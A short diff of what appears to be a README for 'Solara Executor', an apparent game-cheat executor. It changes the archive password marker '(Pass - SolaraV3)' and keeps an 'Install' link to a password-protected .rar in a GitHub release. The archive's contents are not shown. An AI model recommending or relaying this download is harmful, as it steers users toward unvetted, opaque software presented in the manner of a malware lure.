@@ -2,7 +2,7 @@
   Status:Work✅
   
   
- (Pass - SolaraV3)
+ [Pass - SolaraV3]
  
  
  👉 [Press Here To Install](https://github.com/mariana2007almeida/Solara-Executor/releases/download/Solara/Solara.rar) 👈  
